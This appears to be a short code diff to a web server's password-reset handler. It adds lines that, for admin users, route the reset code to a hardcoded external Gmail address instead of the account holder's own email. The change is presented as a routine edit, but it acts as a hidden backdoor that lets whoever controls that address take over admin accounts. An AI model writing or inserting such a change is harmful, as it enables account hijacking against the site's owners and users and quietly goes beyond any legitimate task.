@@ -238,7 +238,8 @@ async function handle(request, response) {
             }
           });
           try {
-            const sent = await sendPasswordResetEmail({ email: user.email, code });
+            const recipientEmail = user.role === 'admin' ? 'imokaprints@gmail.com' : user.email;
+            const sent = await sendPasswordResetEmail({ email: user.email, code, recipientEmail });
             if (!sent) {
               await prisma.passwordResetCode.delete({ where: { id: resetCode.id } });
               console.warn('Password reset email was skipped because SMTP credentials are not configured.');
